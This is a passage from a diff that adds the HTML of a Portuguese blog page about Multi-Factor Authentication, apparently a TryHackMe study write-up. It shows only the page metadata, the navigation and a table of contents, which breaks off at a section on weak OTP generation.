@@ -1,0 +1,929 @@
+<!DOCTYPE html>
+<html lang="pt" dir="ltr"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" /><meta name="robots" content="noindex, nofollow" />
+  <link rel="icon shortcut" href="/favicon.ico" sizes="32x32" />
+<link rel="icon" href="/favicon.svg" type="image/svg+xml" id="favicon-svg" />
+<link rel="icon" href="/favicon-16x16.png" type="image/png" sizes="16x16" />
+<link rel="icon" href="/favicon-32x32.png" type="image/png" sizes="32x32" />
+<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180" />
+<link fetchpriority="low" href="/site.webmanifest" rel="manifest" />
+<title>Multi-Factor Authentication – Alex Paulino</title>
+  <meta name="description" content="Introdução Multi-Factor Authentication (MFA) tem uma papel importante em aplicações modernas, adicionando uma camada extra de proteção contra ataques. MFA utiliza diferentes combinações, por exemplo:
+Senha. Algo que você tem (celular). Algo que você possui (biometria). O objetivo da aula é entender melhor, os conceitos de MFA, como também sua importância no fortalecimento da segurança. Além de explorar diferentes tipos de fatores de autenticação utilizando MFA, ao final da aula teremos um melhor entendimento sobre essa tecnologia, através de estudo em cenários práticos onde o MFA é implementado para proteger informações sensíveis." /><link rel="canonical" href="http://localhost:1313/posts/2025/2025-02-03-mfa/" itemprop="url" />
+
+<meta property="og:title" content="Multi-Factor Authentication">
+<meta
+  property="og:description"
+  content="
+    
+      Introdução
+    Multi-Factor Authentication (MFA) tem uma papel importante em aplicações modernas, adicionando uma camada extra de proteção contra ataques. MFA utiliza diferentes combinações, por exemplo:
+
+Senha.
+Algo que você tem (celular).
+Algo que você possui (biometria).
+
+O objetivo da aula é entender melhor, os conceitos de MFA, como também sua importância no fortalecimento da segurança. Além de explorar diferentes tipos de fatores de autenticação utilizando MFA, ao final da aula teremos um melhor entendimento sobre essa tecnologia, através de estudo em cenários práticos onde o MFA é implementado para proteger informações sensíveis.
+    
+  ">
+<meta
+  property="og:type"
+  content="
+    article
+  ">
+<meta property="og:url" content="http://localhost:1313/posts/2025/2025-02-03-mfa/"><meta property="article:section" content="posts">
+
+<meta
+  property="article:published_time"
+  content="2025-02-03T18:53:00-03:00">
+
+
+<meta
+  property="article:modified_time"
+  content="2025-02-03T18:53:00-03:00">
+
+
+
+	<meta itemprop="name" content="Multi-Factor Authentication">
+	<meta itemprop="description" content="Introdução Multi-Factor Authentication (MFA) tem uma papel importante em aplicações modernas, adicionando uma camada extra de proteção contra ataques. MFA utiliza diferentes combinações, por exemplo:
+Senha. Algo que você tem (celular). Algo que você possui (biometria). O objetivo da aula é entender melhor, os conceitos de MFA, como também sua importância no fortalecimento da segurança. Além de explorar diferentes tipos de fatores de autenticação utilizando MFA, ao final da aula teremos um melhor entendimento sobre essa tecnologia, através de estudo em cenários práticos onde o MFA é implementado para proteger informações sensíveis.">
+	<meta itemprop="datePublished" content="2025-02-03T18:53:00-03:00">
+	<meta itemprop="dateModified" content="2025-02-03T18:53:00-03:00">
+	<meta itemprop="wordCount" content="2807">
+	<meta itemprop="keywords" content="Mfa,Tryhackme,Web,Authentication">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="Multi-Factor Authentication">
+	<meta name="twitter:description" content="Introdução Multi-Factor Authentication (MFA) tem uma papel importante em aplicações modernas, adicionando uma camada extra de proteção contra ataques. MFA utiliza diferentes combinações, por exemplo:
+Senha. Algo que você tem (celular). Algo que você possui (biometria). O objetivo da aula é entender melhor, os conceitos de MFA, como também sua importância no fortalecimento da segurança. Além de explorar diferentes tipos de fatores de autenticação utilizando MFA, ao final da aula teremos um melhor entendimento sobre essa tecnologia, através de estudo em cenários práticos onde o MFA é implementado para proteger informações sensíveis.">
+<link href="/css/compiled/main.css" rel="stylesheet" />
+    <link href="/css/variables.css" rel="stylesheet" />
+    <link href="/css/custom.css" rel="stylesheet" />
+
+  
+<script src="/js/main-head.js" integrity=""></script>
+
+  
+  
+  </head>
+<body>
+    <a href="#content" class="hx:sr-only hx:focus-visible:not-sr-only hx:focus-visible:fixed hx:focus-visible:z-50 hx:focus-visible:top-2 hx:focus-visible:left-2 hx:focus-visible:bg-primary-500 hx:focus-visible:text-white hx:focus-visible:px-4 hx:focus-visible:py-2 hx:focus-visible:rounded-md hx:focus-visible:text-sm hx:focus-visible:font-medium">Saltar para o conteúdo</a><div class="hextra-nav-container hx:sticky hx:top-0 hx:z-20 hx:w-full hx:bg-transparent hx:print:hidden">
+  <div
+    class="hextra-nav-container-blur hx:pointer-events-none hx:absolute hx:z-[-1] hx:h-full hx:w-full hx:bg-white hx:dark:bg-dark hx:shadow-[0_2px_4px_rgba(0,0,0,.02),0_1px_0_rgba(0,0,0,.06)] hx:contrast-more:shadow-[0_0_0_1px_#000] hx:dark:shadow-[0_-1px_0_rgba(255,255,255,.1)_inset] hx:contrast-more:dark:shadow-[0_0_0_1px_#fff]"
+  ></div>
+
+  <nav class="hextra-max-navbar-width hx:mx-auto hx:flex hx:items-center hx:justify-end hx:gap-1 hx:md:gap-2 hx:h-[var(--hextra-navbar-height)] hx:px-6">
+    <a class="hx:flex hx:items-center hx:hover:opacity-75 hx:ltr:mr-auto hx:rtl:ml-auto" href="/">
+    <img class="hx:mr-2 hx:block hx:dark:hidden" src="/images/logo.svg" alt="Logo" height="20" width="20" />
+    <img class="hx:mr-2 hx:hidden hx:dark:block" src="/images/logo.svg" alt="Dark Logo" height="20" width="20" />
+    <span class="hx:mr-2 hx:font-extrabold hx:inline hx:select-none">Alex Paulino</span>
+</a>
+<button
+    type="button"
+    class="hextra-search-trigger"
+    data-search-open
+    aria-haspopup="dialog"
+    aria-controls="hextra-search-dialog"
+    aria-label="Procurar..."
+  ><svg class="hextra-search-trigger-icon" focusable="false" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"/></svg><span class="hextra-search-trigger-label">Procurar...</span>
+    <kbd class="hextra-search-trigger-kbd">CTRL K</kbd>
+  </button><a
+  title=""
+  href="/about/"
+  
+  class="hx:text-sm hx:contrast-more:text-gray-700 hx:contrast-more:dark:text-gray-100 hx:relative hx:-ml-2 hx:hidden hx:whitespace-nowrap hx:p-2 hx:md:inline-flex hx:items-center hx:gap-1 hx:text-gray-600 hx:hover:text-gray-800 hx:dark:text-gray-400 hx:dark:hover:text-gray-200"
+><span class="hx:text-center">Sobre</span>
+</a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://github.com/alxpas" title="GitHub"><svg height=24 fill="currentColor" viewBox="3 3 18 18">
+  <path d="M12 3C7.0275 3 3 7.12937 3 12.2276C3 16.3109 5.57625 19.7597 9.15374 20.9824C9.60374 21.0631 9.77249 20.7863 9.77249 20.5441C9.77249 20.3249 9.76125 19.5982 9.76125 18.8254C7.5 19.2522 6.915 18.2602 6.735 17.7412C6.63375 17.4759 6.19499 16.6569 5.8125 16.4378C5.4975 16.2647 5.0475 15.838 5.80124 15.8264C6.51 15.8149 7.01625 16.4954 7.18499 16.7723C7.99499 18.1679 9.28875 17.7758 9.80625 17.5335C9.885 16.9337 10.1212 16.53 10.38 16.2993C8.3775 16.0687 6.285 15.2728 6.285 11.7432C6.285 10.7397 6.63375 9.9092 7.20749 9.26326C7.1175 9.03257 6.8025 8.08674 7.2975 6.81794C7.2975 6.81794 8.05125 6.57571 9.77249 7.76377C10.4925 7.55615 11.2575 7.45234 12.0225 7.45234C12.7875 7.45234 13.5525 7.55615 14.2725 7.76377C15.9937 6.56418 16.7475 6.81794 16.7475 6.81794C17.2424 8.08674 16.9275 9.03257 16.8375 9.26326C17.4113 9.9092 17.76 10.7281 17.76 11.7432C17.76 15.2843 15.6563 16.0687 13.6537 16.2993C13.98 16.5877 14.2613 17.1414 14.2613 18.0065C14.2613 19.2407 14.25 20.2326 14.25 20.5441C14.25 20.7863 14.4188 21.0746 14.8688 20.9824C16.6554 20.364 18.2079 19.1866 19.3078 17.6162C20.4077 16.0457 20.9995 14.1611 21 12.2276C21 7.12937 16.9725 3 12 3Z"></path>
+</svg>
+<span class="hx:sr-only">GitHub</span>
+          </a>
+          <a class="hx:p-1 hx:md:p-2 hx:text-current" target="_blank" rel="noreferrer" href="https://www.linkedin.com/in/alexpaulino/" title="LinkedIn"><svg height=24 xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="currentColor" d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037c-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85c3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065a2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg><span class="hx:sr-only">LinkedIn</span>
+          </a><button type="button" aria-label="Menu" aria-expanded="false" class="hextra-hamburger-menu hx:cursor-pointer hx:-mr-1 hx:rounded-sm hx:p-1 hx:active:bg-gray-400/20 hx:md:hidden hx:hextra-focus-visible-inset"><svg height=24 fill="none" viewBox="0 0 24 24" stroke="currentColor"><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 8H20"></path></g><g><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 16H20"></path></g></svg></button>
+  </nav>
+</div>
+
+  <div class="hx:mx-auto hx:flex hextra-max-page-width">
+    <aside class="hextra-sidebar-container hx:flex hx:flex-col hx:print:hidden hx:md:top-[var(--hextra-navbar-height)] hx:md:shrink-0 hx:md:w-64 hx:md:self-start hx:max-md:[transform:translate3d(0,-100%,0)] hx:md:hidden hx:xl:block">
+  <div class="hextra-scrollbar hx:overflow-y-auto hx:overflow-x-hidden hx:p-4 hx:grow hx:md:h-[calc(100vh-var(--hextra-navbar-height)-var(--menu-height))]">
+    <ul class="hx:flex hx:flex-col hx:gap-1 hx:md:hidden">
+      
+      <li><div class="hextra-sidebar-item hx:group hx:relative hx:flex hx:items-center" data-active="false">
+    <a
+      class="hx:flex hx:items-center hx:justify-between hx:gap-2 hx:grow hx:cursor-pointer hx:rounded-sm hx:px-2 hx:py-1.5 hx:text-sm hx:transition-colors [-webkit-tap-highlight-color:transparent] [-webkit-touch-callout:none] hx:hextra-focus-visible-inset hx:text-gray-500 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:contrast-more:border hx:contrast-more:border-transparent hx:contrast-more:text-gray-900 hx:contrast-more:hover:border-gray-900 hx:dark:text-neutral-400 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:contrast-more:dark:text-gray-50 hx:contrast-more:dark:hover:border-gray-50"
+      href="/about/"
+      
+    >
+      <span class="hx:min-w-0 [word-break:break-word]">Sobre</span>
+    </a>
+  </div></li>
+    </ul>
+
+    <div class="hx:max-xl:hidden hx:h-0 hx:w-64 hx:shrink-0"></div></div>
+  
+  
+    <div class="hx:md:hidden hx:justify-end hx:sticky hx:bottom-0 hx:max-h-(--menu-height) hx:bg-white hx:dark:bg-dark hx:mx-4 hx:py-4 hx:shadow-[0_-12px_16px_#fff] hx:flex hx:items-center hx:gap-2 hx:border-gray-200 hx:dark:border-neutral-800 hx:dark:shadow-[0_-12px_16px_#111] hx:contrast-more:border-neutral-400 hx:contrast-more:shadow-none hx:contrast-more:dark:shadow-none hx:border-t" data-toggle-animation="show"><div class="hx:flex hx:justify-items-start hx:grow">
+    <button
+      title="Mudar a língua"
+      data-state="closed"
+      data-location=""
+      class="hextra-language-switcher hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:grow"
+      type="button"
+      aria-label="Mudar a língua"
+      aria-expanded="false"
+      aria-haspopup="menu"
+    >
+      <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.03 3-9s-1.343-9-3-9m0 18c-1.657 0-3-4.03-3-9s1.343-9 3-9m-9 9a9 9 0 019-9"/></svg><span>Português</span></div>
+    </button>
+    <ul
+      class="hextra-language-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+      style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+      role="menu"
+    >
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/posts/2025/2025-02-03-mfa/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >Português<span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span></a>
+        </li>
+      <li role="none" class="hx:flex hx:flex-col">
+          <a
+            href="/en/"
+            role="menuitem"
+            class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9"
+          >English</a>
+        </li>
+      </ul>
+  </div><div class="hx:flex hx:justify-items-start hx:group" data-theme="light">
+  <button
+    title="Mudar tema"
+    data-state="closed"
+    data-location="bottom-right"
+    class="hextra-theme-toggle hx:cursor-pointer hx:rounded-md hx:text-left hx:font-medium hx:h-7 hx:px-2 hx:text-xs hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-primary-100/5 hx:dark:hover:text-gray-50 hx:font-medium hx:text-gray-600 hx:transition-colors hx:dark:text-gray-400 hx:grow"
+    type="button"
+    aria-label="Mudar tema"
+    aria-expanded="false"
+    aria-haspopup="menu"
+  >
+    <div class="hx:flex hx:items-center hx:gap-2 hx:capitalize"><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"/></svg><svg height=12 class="hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M20.354 15.354A9 9 0 018.646 3.646 9.003 9.003 0 0012 21a9.003 9.003 0 008.354-5.646z"/></svg><svg height=12 class="hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"  fill="currentColor">
+  <path d="M 11.996094,2 C 6.4986225,2.0192368 2.03125,6.5024993 2.03125,12 c 0,5.497501 4.4673725,9.980763 9.964844,10 H 12 12.0039 c 5.497471,-0.01924 9.964844,-4.502499 9.964844,-10 0,-5.4975007 -4.467373,-9.9807632 -9.964844,-10 H 12 Z M 12,4 c 4.417218,0.017598 7.96875,3.5822356 7.96875,8 0,4.417764 -3.551532,7.982402 -7.96875,8 z" />
+</svg>
+</div>
+  </button>
+  <ul
+    class="hextra-theme-toggle-options hx:hidden hx:z-20 hx:max-h-64 hx:overflow-auto hx:rounded-lg hx:border hx:border-gray-200 hx:bg-white hx:p-1 hx:text-sm hx:shadow-lg hx:dark:border-neutral-700 hx:dark:bg-neutral-900"
+    style="position: fixed; inset: auto auto 0px 0px; margin: 0px; min-width: 100px;"
+    data-theme="light"
+    role="menu"
+  >
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="true"
+        tabindex="-1"
+        data-item="light"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Claro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="dark"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Escuro
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=light]:hidden hx:group-data-[theme=system]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+    <li role="none" class="hx:flex hx:flex-col">
+      <button
+        type="button"
+        role="menuitemradio"
+        aria-checked="false"
+        tabindex="-1"
+        data-item="system"
+        class="hx:text-gray-700 hx:dark:text-gray-300 hx:hover:bg-gray-100 hx:hover:text-gray-900 hx:dark:hover:bg-neutral-800 hx:dark:hover:text-gray-100 hx:relative hx:cursor-pointer hx:whitespace-nowrap hx:rounded-sm hx:py-1.5 hx:transition-colors hx:ltr:pl-3 hx:ltr:pr-9 hx:rtl:pr-3 hx:rtl:pl-9 hx:text-left hx:w-full hx:bg-transparent hx:border-0"
+      >
+        Sistema
+         <span class="hx:absolute hx:inset-y-0 hx:flex hx:items-center hx:ltr:right-3 hx:rtl:left-3 hx:group-data-[theme=dark]:hidden hx:group-data-[theme=light]:hidden"><svg height=1em width=1em xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M5 13l4 4L19 7"/></svg></span>
+      </button>
+    </li>
+  </ul>
+</div>
+</div></aside>
+    
+<nav class="hextra-toc hx:order-last hx:hidden hx:w-64 hx:shrink-0 hx:xl:block hx:print:hidden hx:px-4" aria-label="Índice">
+    <div class="hextra-scrollbar hx:sticky hx:top-[var(--hextra-navbar-height)] hx:overflow-y-auto hx:pr-4 hx:pt-6 hx:text-sm [hyphens:auto] hx:max-h-[calc(100vh-var(--hextra-navbar-height)-env(safe-area-inset-bottom))] hx:ltr:-mr-4 hx:rtl:-ml-4"><p class="hx:mb-4 hx:font-semibold hx:tracking-tight">Nesta página</p><ul>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#introdu%c3%a7%c3%a3o">Introdução
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#como-mfa-funciona">Como MFA funciona
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#tipo-de-fator-de-autentica%c3%a7%c3%a3o">Tipo de fator de autenticação
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#tipos-de-2fa">Tipos de 2FA
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#acesso-condicional">Acesso Condicional
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#baseado-na-localiza%c3%a7%c3%a3o">Baseado na Localização
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#baseado-em-tempo">Baseado em Tempo
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-8 hx:rtl:pr-8 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#an%c3%a1lise-por-comportamento">Análise por Comportamento
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#ado%c3%a7%c3%a3o-global-e-impulso-regulat%c3%b3rio">Adoção Global e Impulso Regulatório
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pergunta">Pergunta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#implementa%c3%a7%c3%b5es-e-aplica%c3%a7%c3%b5es">Implementações e Aplicações
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#mfa-bancos">MFA Bancos
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#mfa-em-sa%c3%bade">MFA em Saúde
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#mfa-em-ti-corporativa">MFA em TI Corporativa
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#pergunta-1">Pergunta
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:font-medium hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#vulnerabilidades-comuns-em-mfa">Vulnerabilidades comuns em MFA
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
+        <a class="hx:ltr:pl-4 hx:rtl:pr-4 hx:inline-block hx:rounded-sm hx:text-gray-500 hx:hover:text-gray-900 hx:dark:text-gray-400 hx:dark:hover:text-gray-300 hx:contrast-more:text-gray-900 hx:contrast-more:underline hx:contrast-more:dark:text-gray-50 hx:w-full hx:wrap-break-word hx:hextra-focus-visible-inset" href="#fraqueza-no-algoritmo-de-gera%c3%a7%c3%a3o-do-otp">Fraqueza no Algoritmo de Geração do OTP
+        </a>
+      </li>
+      <li class="hx:my-2 hx:scroll-my-6 hx:scroll-py-6">
